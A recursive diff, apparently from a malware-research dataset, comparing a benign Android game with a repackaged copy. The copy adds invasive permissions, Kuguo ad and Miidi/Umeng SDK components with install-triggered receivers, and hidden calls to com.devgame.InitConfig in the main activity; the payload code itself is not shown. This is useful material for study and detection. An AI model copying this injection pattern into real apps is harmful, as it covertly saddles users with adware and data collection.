@@ -1,0 +1,438 @@
+diff -r result/APP_76/App_B_76/AndroidManifest.xml result/APP_76/App_M_76/AndroidManifest.xml
+2a3
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+3a5,10
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.READ_LOGS"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+6d12
+<     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+15a22,39
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.kuguo.ad.MainActivity" android:theme="@android:style/Theme.Dialog"/>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.kuguo.ad.BoutiqueActivity" android:theme="@android:style/Theme.Dialog"/>
+>         <service android:name="com.kuguo.ad.MainService"/>
+>         <receiver android:name="com.kuguo.ad.MainReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:name="net.miidi.credit.MiidiWebViewActivity"/>
+>         <receiver android:name="net.miidi.credit.CPAFeeReceiver"/>
+>         <meta-data android:name="miidi_channelid" android:value="0"/>
+>         <meta-data android:name="channelId" android:value="goapk"/>
+>         <meta-data android:name="UMENG_APPKEY" android:value="5006cde252701551740000d6"/>
+>         <meta-data android:name="UMENG_CHANNEL" android:value="goapk"/>
+diff -r result/APP_76/App_B_76/apktool.yml result/APP_76/App_M_76/apktool.yml
+2c2
+< apkFileName: Bapp76-AC5A648F7103E05DDD2C9E47B2CAEE849FE39FB011C32F95C0B02C2BD068A38C.apk
+---
+> apkFileName: Mapp76-92FCE0663DF69322D1B2B5D18258E6DF515A12ECCA2F13F86013A812C2122F07.apk
+5d4
+< - resources.arsc
+17,20c16
+< unknownFiles:
+<   com/ins/r2/game/map/MapLayer.java.bak: '8'
+<   com/ins/r2/game/UI/UIlayer.java.bak: '8'
+<   org/cocos2d/tests/test.lst: '8'
+---
+> unknownFiles: {}
+Somente em result/APP_76/App_M_76/assets: kuguo_res
+Somente em result/APP_76/App_M_76/com: devgame
+diff -r result/APP_76/App_B_76/com/ins/r2/R2_Run_Activity.java result/APP_76/App_M_76/com/ins/r2/R2_Run_Activity.java
+15a16
+> import com.devgame.InitConfig;
+141a143
+>     InitConfig.init(this);
+162a165
+>     InitConfig.destroy(this);
+Somente em result/APP_76/App_M_76/com: kuguo
+Somente em result/APP_76/App_M_76/com: umeng
+Somente em result/APP_76/App_M_76/: net
+diff -r result/APP_76/App_B_76/org/cocos2d/tests/AtlasTest.java result/APP_76/App_M_76/org/cocos2d/tests/AtlasTest.java
+162,163c162,169
+<       ccColor4B[] arrayOfCcColor4B1 = { ccColor4B.ccc4(255, 255, 255, 255), ccColor4B.ccc4(255, 0, 0, 255), ccColor4B.ccc4(255, 255, 255, 255), ccColor4B.ccc4(0, 255, 0, 255) };
+<       ccColor4B[] arrayOfCcColor4B2 = { ccColor4B.ccc4(255, 0, 0, 255), ccColor4B.ccc4(0, 255, 0, 255), ccColor4B.ccc4(0, 0, 255, 255), ccColor4B.ccc4(255, 255, 0, 255) };
+---
+>       ccColor4B localCcColor4B5 = ccColor4B.ccc4(255, 255, 255, 255);
+>       ccColor4B localCcColor4B6 = ccColor4B.ccc4(255, 0, 0, 255);
+>       ccColor4B localCcColor4B7 = ccColor4B.ccc4(255, 255, 255, 255);
+>       ccColor4B localCcColor4B8 = ccColor4B.ccc4(0, 255, 0, 255);
+>       ccColor4B localCcColor4B9 = ccColor4B.ccc4(255, 0, 0, 255);
+>       ccColor4B localCcColor4B10 = ccColor4B.ccc4(0, 255, 0, 255);
+>       ccColor4B localCcColor4B11 = ccColor4B.ccc4(0, 0, 255, 255);
+>       ccColor4B localCcColor4B12 = ccColor4B.ccc4(255, 255, 0, 255);
+171c177
+<         this.textureAtlas.updateColor(new ccColor4B[][] { { localCcColor4B1, localCcColor4B2, localCcColor4B3, localCcColor4B4 }, arrayOfCcColor4B1, arrayOfCcColor4B2 }[i], i);
+---
+>         this.textureAtlas.updateColor(new ccColor4B[][] { { localCcColor4B1, localCcColor4B2, localCcColor4B3, localCcColor4B4 }, { localCcColor4B5, localCcColor4B6, localCcColor4B7, localCcColor4B8 }, { localCcColor4B9, localCcColor4B10, localCcColor4B11, localCcColor4B12 } }[i], i);
+Os arquivos binários result/APP_76/App_B_76/original/AndroidManifest.xml e result/APP_76/App_M_76/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_76/App_B_76/original/META-INF/CERT.RSA e result/APP_76/App_M_76/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_76/App_B_76/original/META-INF/CERT.SF result/APP_76/App_M_76/original/META-INF/CERT.SF
+2,3c2,3
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: bZg8/FRbU4Muge/U1iVfdpv7G04=
+---
+> Created-By: 1.0 (Android SignApk)
+> SHA1-Digest-Manifest: 4p+chI+LlI7xG8S6l23VwuNMCh0=
+17,19d16
+< Name: assets/map/stage3/bg_3-2-hd.png
+< SHA1-Digest: m/PgGE51LpCyK4T8pld8f1tPxyE=
+< 
+22a20,22
+> Name: assets/map/stage3/bg_3-2-hd.png
+> SHA1-Digest: m/PgGE51LpCyK4T8pld8f1tPxyE=
+> 
+34a35,37
+> Name: assets/kuguo_res/rating_half.png
+> SHA1-Digest: PMXbhhnPK1/KrUlzUqZ7q5+DCOY=
+> 
+89,90c92,93
+< Name: com/ins/r2/game/UI/UIlayer.java.bak
+< SHA1-Digest: WW3/HHb0s/jahObXfcDG0ta/EPU=
+---
+> Name: assets/kuguo_res/kuguo_side.png
+> SHA1-Digest: pUWx8KvQWCNzzeT16G05W5fa9u0=
+119,121d121
+< Name: assets/map/stage2/bg_2-3-2-hd.png
+< SHA1-Digest: hQQBOvFnvg2IjEX1Obeg9NNcmNM=
+< 
+124a125,127
+> Name: assets/map/stage2/bg_2-3-2-hd.png
+> SHA1-Digest: hQQBOvFnvg2IjEX1Obeg9NNcmNM=
+> 
+128,130d130
+< Name: assets/scroll/i_map7.png
+< SHA1-Digest: 7t0EDNi1iWkYNUueppf+/nldpMU=
+< 
+133a134,136
+> Name: assets/scroll/i_map7.png
+> SHA1-Digest: 7t0EDNi1iWkYNUueppf+/nldpMU=
+> 
+166a170,172
+> Name: assets/kuguo_res/spot_default.png
+> SHA1-Digest: j5G+wQ6dp8tu9dKwXtuWPTdJIbg=
+> 
+219c225
+< SHA1-Digest: 05sQWIK86kYRXXNZ57P5lWTFunE=
+---
+> SHA1-Digest: CqoDCA1uOOCZNYNqBOSeVgA4coA=
+274a281,283
+> Name: assets/kuguo_res/kuguo_side2.png
+> SHA1-Digest: emkIp8SHolTfyNnKMG7hkV1s1aE=
+> 
+297c306
+< SHA1-Digest: ckTKc0A1NO3ASHfn0//ez9u9+A0=
+---
+> SHA1-Digest: x6a7A2TfmQ12OSP/l8S+DqPeoeI=
+301a311,316
+> Name: assets/kuguo_res/installed.png
+> SHA1-Digest: uON+Oi96KjfQNj1q/LCCqcFbKf0=
+> 
+> Name: assets/kuguo_res/360.png
+> SHA1-Digest: FZTNNvzgMEoLhWncGneGp4CYkk0=
+> 
+361a377,379
+> Name: assets/kuguo_res/confirm_btn_pressed.png
+> SHA1-Digest: DLo9FsQPY0aO1jrOI9rciqZN6v0=
+> 
+364a383,385
+> Name: res/drawable/replay_selector.xml
+> SHA1-Digest: UBPG9yLYwRmPxdL3Kkn+cpFmRfU=
+> 
+371,373d391
+< Name: res/drawable/replay_selector.xml
+< SHA1-Digest: 54EdBFvKGQ+ZLk0X8B0QXJAszEY=
+< 
+379a398,400
+> Name: assets/kuguo_res/kuguo_top_pressed.png
+> SHA1-Digest: 5rdFFTTX++ieM6PTs7zKGvckBkk=
+> 
+385a407,409
+> Name: assets/kuguo_res/rating_full.png
+> SHA1-Digest: nWWMGKSDcQ09UEVq+8nEJ092E3k=
+> 
+417c441
+< SHA1-Digest: 5DYvs5Tkij7TpKhtWW+/WPMK2ZU=
+---
+> SHA1-Digest: nKcpd22DKy7syTWv+FRUGLEr/1s=
+432c456
+< SHA1-Digest: o+CSMMTXgwjVOoaKaDjw+WiVtFY=
+---
+> SHA1-Digest: XHSsImRvybRs3uDcfPASZRT47n8=
+437,439d460
+< Name: org/cocos2d/tests/test.lst
+< SHA1-Digest: OMimZ14h+Pk2QqAYNF4LJI+rhrs=
+< 
+445a467,469
+> Name: assets/kuguo_res/push_cancel_btn_pressed.png
+> SHA1-Digest: 40WHVDdM8kZb/q54nNbuaE8BlhM=
+> 
+448a473,475
+> Name: assets/kuguo_res/download_btn2.png
+> SHA1-Digest: toMTngQnEGJx2v8SBYt2FRqRJmg=
+> 
+450c477
+< SHA1-Digest: adsNj7cdsDX94MUXQMvmxKDYWto=
+---
+> SHA1-Digest: wKDaDBJXawnbD8ayg4/cVmXX6tI=
+454a482,484
+> Name: assets/kuguo_res/push_cancel_btn.png
+> SHA1-Digest: iSxAiKO82hU1AeXsuKgB3Imvov4=
+> 
+466a497,499
+> Name: assets/kuguo_res/icon.png
+> SHA1-Digest: Mp0t/QlWdXcsKkZEPqOeQF1a5J0=
+> 
+469a503,508
+> Name: assets/kuguo_res/fold_arrow.png
+> SHA1-Digest: YlBVEsVMBnGLiKPkVdT8jntv5zY=
+> 
+> Name: assets/kuguo_res/download_btn2_pressed.png
+> SHA1-Digest: ZXInUC0nzWILs+lBTSKLaoQu6Kc=
+> 
+472a512,514
+> Name: assets/kuguo_res/kuguo_top.png
+> SHA1-Digest: nbBiRcbWh9OdMfJVjo8xsYF4CsQ=
+> 
+511a554,556
+> Name: assets/kuguo_res/spot_light.png
+> SHA1-Digest: exCEUCoij44b4J2D6hSxXrd8Lng=
+> 
+518,520d562
+< Name: assets/map/stage3/bg_3-3-2-hd.png
+< SHA1-Digest: EtsEC39KLQgqBmGa9UuNKsRVaJc=
+< 
+523a566,568
+> Name: assets/map/stage3/bg_3-3-2-hd.png
+> SHA1-Digest: EtsEC39KLQgqBmGa9UuNKsRVaJc=
+> 
+527,529d571
+< Name: assets/map/stage3/bg_3-1-hd.png
+< SHA1-Digest: RtVI347GHpvVH1zvBMyGX/ouKB4=
+< 
+532a575,577
+> Name: assets/map/stage3/bg_3-1-hd.png
+> SHA1-Digest: RtVI347GHpvVH1zvBMyGX/ouKB4=
+> 
+549c594
+< SHA1-Digest: vWWsKPZVhBma56gEErUMdUtBt9M=
+---
+> SHA1-Digest: qq5isyiVdH+yyNb1SL+jYPJRRh8=
+562a608,610
+> Name: assets/menu/i_main8.png
+> SHA1-Digest: T8Khddz0zWY08CLbTYVPobZQ1rU=
+> 
+566,567c614,615
+< Name: assets/menu/i_main8.png
+< SHA1-Digest: T8Khddz0zWY08CLbTYVPobZQ1rU=
+---
+> Name: assets/kuguo_res/snapshot_empty.png
+> SHA1-Digest: xwmLE3+EkzoBatMn8lpxanytqXg=
+587,589d634
+< Name: com/ins/r2/game/map/MapLayer.java.bak
+< SHA1-Digest: px1bWP7GRSQb1x6cCRdybj3eYlI=
+< 
+592a638,640
+> Name: assets/kuguo_res/kuguo.png
+> SHA1-Digest: bDMuesWvLatDEc07k0RwsCX5/qg=
+> 
+601a650,652
+> Name: assets/kuguo_res/confirm_btn.png
+> SHA1-Digest: dyfZ67AGcUzIDQUXmzeyMP4bJeE=
+> 
+639a691,693
+> 
+> Name: assets/kuguo_res/rating_empty.png
+> SHA1-Digest: yBv78HZ6lquUiuKtbBcoGLXN2IA=
+diff -r result/APP_76/App_B_76/original/META-INF/MANIFEST.MF result/APP_76/App_M_76/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.0 (Android SignApk)
+16,18d15
+< Name: assets/map/stage3/bg_3-2-hd.png
+< SHA1-Digest: akoBm7D4mssG7o8ZLbA2j9LEAsE=
+< 
+21a19,21
+> Name: assets/map/stage3/bg_3-2-hd.png
+> SHA1-Digest: akoBm7D4mssG7o8ZLbA2j9LEAsE=
+> 
+33a34,36
+> Name: assets/kuguo_res/rating_half.png
+> SHA1-Digest: S00vYSJAZN4Kp03dNJ9JV3C7gyA=
+> 
+88,89c91,92
+< Name: com/ins/r2/game/UI/UIlayer.java.bak
+< SHA1-Digest: joOXQS0S7p7tUnZ0XQwZHFjHDdk=
+---
+> Name: assets/kuguo_res/kuguo_side.png
+> SHA1-Digest: /yJxD5QPHvZTl9gVzckrOwkqsVc=
+118,120d120
+< Name: assets/map/stage2/bg_2-3-2-hd.png
+< SHA1-Digest: cQ+BmX15ZTBSIZq4nRghmMd4lp4=
+< 
+123a124,126
+> Name: assets/map/stage2/bg_2-3-2-hd.png
+> SHA1-Digest: cQ+BmX15ZTBSIZq4nRghmMd4lp4=
+> 
+127,129d129
+< Name: assets/scroll/i_map7.png
+< SHA1-Digest: O4ZkGXX3jdsF3845goKYpbVqkGU=
+< 
+132a133,135
+> Name: assets/scroll/i_map7.png
+> SHA1-Digest: O4ZkGXX3jdsF3845goKYpbVqkGU=
+> 
+165a169,171
+> Name: assets/kuguo_res/spot_default.png
+> SHA1-Digest: E4fi2Oiw3vnkWEnhps2hIa4+gp8=
+> 
+218c224
+< SHA1-Digest: YD0DxjXGzxh6uvTvUfwcR5veDew=
+---
+> SHA1-Digest: QyfAdNQ+fLUsBUcZweHfytmrPZ4=
+267a274,276
+> Name: assets/kuguo_res/kuguo_side2.png
+> SHA1-Digest: TV5gKbN886OE4Zydpl4+L+LOYmU=
+> 
+296c305
+< SHA1-Digest: 2Au40QeisWU99/Y43xz4FGTMcKA=
+---
+> SHA1-Digest: SKdEKlXAqD5587yrcMCe7KXV0P4=
+300a310,315
+> Name: assets/kuguo_res/installed.png
+> SHA1-Digest: i1GhQd02nmGumG0Efgq4KVtZY4I=
+> 
+> Name: assets/kuguo_res/360.png
+> SHA1-Digest: l+Fj8rnP63ymLQTbbTeI2n7q89k=
+> 
+360a376,378
+> Name: assets/kuguo_res/confirm_btn_pressed.png
+> SHA1-Digest: mNxr9OFpueKt9Rn83vsUCcm3roc=
+> 
+363a382,384
+> Name: res/drawable/replay_selector.xml
+> SHA1-Digest: Q0MQusd4pRo36wbrIHxYSTjqXb8=
+> 
+370,372d390
+< Name: res/drawable/replay_selector.xml
+< SHA1-Digest: o1jL1cDqHt9WRp9lGS7ymkcrpZw=
+< 
+378a397,399
+> Name: assets/kuguo_res/kuguo_top_pressed.png
+> SHA1-Digest: /tDiKS+zIjOO9zZ1+KBFGJLvlxs=
+> 
+384a406,408
+> Name: assets/kuguo_res/rating_full.png
+> SHA1-Digest: OrNYZwr7L4Fc/g6m44wteyioSI0=
+> 
+416c440
+< SHA1-Digest: L2ecMuOycTr0V/5NKIjtgSO0zvE=
+---
+> SHA1-Digest: U6oMAiT/w3AtHD189WsWknOD9GU=
+431c455
+< SHA1-Digest: FxzW6/YMRKIQ6zAzHg0HEcopSwI=
+---
+> SHA1-Digest: 7aSwFjmPCLjiQ4XkgzTKMuDlSfM=
+436,438d459
+< Name: org/cocos2d/tests/test.lst
+< SHA1-Digest: Q/9HXz2TSRUIKoDsmKy8dxGk1DI=
+< 
+444a466,468
+> Name: assets/kuguo_res/push_cancel_btn_pressed.png
+> SHA1-Digest: UhRfBMZZGUHgA1i0uGFbOWx4SEk=
+> 
+447a472,474
+> Name: assets/kuguo_res/download_btn2.png
+> SHA1-Digest: mnoiAMSb+9/PFWSZZ/2ThYkuDYs=
+> 
+449c476
+< SHA1-Digest: PCVj5CYW85nzfcJVxRUXFuktBVU=
+---
+> SHA1-Digest: uE4j5LNb65etmy20MmnOysaVCkE=
+453a481,483
+> Name: assets/kuguo_res/push_cancel_btn.png
+> SHA1-Digest: zQ+3kBPQs5wwK+CNfm0vSZe9VYc=
+> 
+465a496,498
+> Name: assets/kuguo_res/icon.png
+> SHA1-Digest: xojjGOMaFE9l5JGijGWsO/RgymY=
+> 
+468a502,507
+> Name: assets/kuguo_res/fold_arrow.png
+> SHA1-Digest: aPV5nrym+b3yv4JxlPO9BHg6+k0=
+> 
+> Name: assets/kuguo_res/download_btn2_pressed.png
+> SHA1-Digest: JqsMeWSOWGXiCsvHrx3OJD5JLEM=
+> 
+471a511,513
+> Name: assets/kuguo_res/kuguo_top.png
+> SHA1-Digest: +stugZmNOH1w3MN6Y0DAYL5g8zk=
+> 
+510a553,555
+> Name: assets/kuguo_res/spot_light.png
+> SHA1-Digest: HDYglOL1e3Rk0VmuY8QCQ0oNoTs=
+> 
+517,519d561
+< Name: assets/map/stage3/bg_3-3-2-hd.png
+< SHA1-Digest: Oszg09shJBzPrXIeSt7RoY3iqVk=
+< 
+522a565,567
+> Name: assets/map/stage3/bg_3-3-2-hd.png
+> SHA1-Digest: Oszg09shJBzPrXIeSt7RoY3iqVk=
+> 
+526,528d570
+< Name: assets/map/stage3/bg_3-1-hd.png
+< SHA1-Digest: 2DxoI2dVoTijtspCvtrTl7vJAkg=
+< 
+531a574,576
+> Name: assets/map/stage3/bg_3-1-hd.png
+> SHA1-Digest: 2DxoI2dVoTijtspCvtrTl7vJAkg=
+> 
+543a589,591
+> Name: res/layout/main.xml
+> SHA1-Digest: 33A3NdylJJYYX+X22oQrbie0s/0=
+> 
+547,549d594
+< Name: res/layout/main.xml
+< SHA1-Digest: jsCXMjiKFjoUV0UcfsDsNEtlzVE=
+< 
+567a613,615
+> Name: assets/kuguo_res/snapshot_empty.png
+> SHA1-Digest: DSmTSCP3TKTP8Cw8/9byyIcYP28=
+> 
+586,588d633
+< Name: com/ins/r2/game/map/MapLayer.java.bak
+< SHA1-Digest: u4DLw0UHzhb3kSYYcneHYIbELQA=
+< 
+591a637,639
+> Name: assets/kuguo_res/kuguo.png
+> SHA1-Digest: RuPZmtaRC1tisx8zwArgndvGfA8=
+> 
+600a649,651
+> Name: assets/kuguo_res/confirm_btn.png
+> SHA1-Digest: bKjU+M74YySS1qW5nxZ+v4udGCk=
+> 
+638a690,692
+> 
+> Name: assets/kuguo_res/rating_empty.png
+> SHA1-Digest: /pdjhl209wEvFa24abz75d7jrts=
+Somente em result/APP_76/App_M_76/smali/com: devgame
+diff -r result/APP_76/App_B_76/smali/com/ins/r2/R2_Run_Activity.smali result/APP_76/App_M_76/smali/com/ins/r2/R2_Run_Activity.smali
+474a475,476
+>     invoke-static {p0}, Lcom/devgame/InitConfig;->init(Landroid/content/Context;)V
+> 
+602a605,606
+> 
+>     invoke-static {p0}, Lcom/devgame/InitConfig;->destroy(Landroid/content/Context;)V
+Somente em result/APP_76/App_M_76/smali/com: kuguo
+Somente em result/APP_76/App_M_76/smali/com: umeng
+Somente em result/APP_76/App_M_76/smali: net
+Somente em result/APP_76/App_B_76/: unknown
